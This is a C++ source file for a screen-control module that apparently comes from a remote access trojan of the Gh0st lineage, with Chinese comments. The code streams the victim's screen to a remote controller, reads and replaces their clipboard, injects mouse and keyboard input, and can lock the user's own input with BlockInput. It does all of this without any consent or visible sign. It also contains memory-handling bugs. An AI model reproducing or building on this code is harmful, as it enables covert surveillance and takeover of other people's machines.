// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenManager.h"
#include "Common.h"
#include <IOSTREAM>
#if _MSC_VER <= 1200
#include <Winable.h>
#else
#include <WinUser.h>
#endif
#include <time.h>
using namespace std;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))

CScreenManager::CScreenManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
{
	m_bIsWorking = TRUE;
	m_bIsBlockInput = FALSE;

	m_ScreenSpyObject = new CScreenSpy(16);

	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);
}


DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{
	CScreenManager *This = (CScreenManager *)lParam;

	This->SendBitMapInfo(); //发送bmp位图结构

	// 等控制端对话框打开
	This->WaitForDialogOpen();   

	clock_t last = clock();
	This->SendFirstScreen();
#if USING_ZLIB
	const int fps = 8;// 帧率
#elif USING_LZ4
	const int fps = 8;// 帧率
#else
	const int fps = 8;// 帧率
#endif
	const int sleep = 1000 / fps;// 间隔时间（ms）
	timeBeginPeriod(1);
	while (This->m_bIsWorking)
	{
		ULONG ulNextSendLength = 0;
		const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
		if (szBuffer)
		{
			int span = sleep-(clock() - last);
			Sleep(span > 0 ? span : 1);
			if (span < 0)
				printf("SendScreen Span = %d ms\n", span);
			last = clock();
			This->SendNextScreen(szBuffer, ulNextSendLength);
			delete[] szBuffer;
			szBuffer = NULL;
		}
	}
	timeEndPeriod(1);
	cout<<"ScreenWorkThread Exit\n";

	return 0;
}

VOID CScreenManager::SendBitMapInfo()
{
	//这里得到bmp结构的大小
	ULONG   ulLength = 1 + m_ScreenSpyObject->GetBISize();
	LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, 
		ulLength, MEM_COMMIT, PAGE_READWRITE);

	szBuffer[0] = TOKEN_BITMAPINFO;
	//这里将bmp位图结构发送出去
	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulLength);
	VirtualFree(szBuffer, 0, MEM_RELEASE);
}

CScreenManager::~CScreenManager()
{
	cout<<"ScreenManager 析构函数\n";

	m_bIsWorking = FALSE;

	WaitForSingleObject(m_hWorkThread, INFINITE);  
	if (m_hWorkThread!=NULL)
	{
		CloseHandle(m_hWorkThread);
	}

	delete[] m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();  
			break;
		}
	case COMMAND_SCREEN_CONTROL:
		{
			BlockInput(false);
			ProcessCommand(szBuffer + 1, ulLength - 1);
			BlockInput(m_bIsBlockInput);  //再恢复成用户的设置

			break;
		}
	case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
		{
			m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //鼠标键盘的锁定

			BlockInput(m_bIsBlockInput);

			break;
		}
	case COMMAND_SCREEN_GET_CLIPBOARD:
		{
			SendClientClipboard();
			break;
		}
	case COMMAND_SCREEN_SET_CLIPBOARD:
		{
			UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
			break;
		}
	}
}


VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;	
	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength);
	if (hGlobal != NULL) { 

		LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal); 
		memcpy(szClipboardVirtualAddress, szBuffer, ulLength); 
		GlobalUnlock(hGlobal);         
		SetClipboardData(CF_TEXT, hGlobal);
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}

VOID CScreenManager::SendClientClipboard()
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //锁定 
	LPBYTE	szBuffer = new BYTE[iPacketLength];


	szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_ClientObject->OnServerSending((char*)szBuffer, iPacketLength);
	delete[] szBuffer;
}


VOID CScreenManager::SendFirstScreen()
{
	//类CScreenSpy的getFirstScreen函数中得到图像数据
	//然后用getFirstImageSize得到数据的大小然后发送出去
	LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();  
	if (FirstScreenData == NULL)
	{
		return;
	}

	ULONG	ulFirstSendLength = 1 + m_ScreenSpyObject->GetFirstScreenLength();
	LPBYTE	szBuffer = new BYTE[ulFirstSendLength];

	szBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);

	m_ClientObject->OnServerSending((char*)szBuffer, ulFirstSendLength);

	delete [] szBuffer;

	szBuffer = NULL;
}

const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
{
	LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);

	if (ulNextSendLength == 0 || NextScreenData == NULL)
	{
		return NULL;
	}

	ulNextSendLength += 1;

	char*	szBuffer = new char[ulNextSendLength];

	szBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(szBuffer + 1, NextScreenData, ulNextSendLength - 1);

	return szBuffer;
}

VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
{
	m_ClientObject->OnServerSending(szBuffer, ulNextSendLength);
}

VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
	// 数据包不合法
	if (ulLength % sizeof(MSG) != 0)
		return;

	// 命令个数
	ULONG	ulMsgCount = ulLength / sizeof(MSG);

	// 处理多个命令
	for (int i = 0; i < ulMsgCount; ++i)
	{
		MSG	*Msg = (MSG *)(szBuffer + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
			{
				POINT Point;
				Point.x = LOWORD(Msg->lParam);
				Point.y = HIWORD(Msg->lParam);
				if(m_ScreenSpyObject->m_bZoomed)
				{
					Point.x *= m_ScreenSpyObject->m_wZoom;
					Point.y *= m_ScreenSpyObject->m_hZoom;
				}
				SetCursorPos(Point.x, Point.y);
				SetCapture(WindowFromPoint(Point));
			}
			break;
		default:
			break;
		}

		switch(Msg->message)   //端口发加快递费
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, 
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}
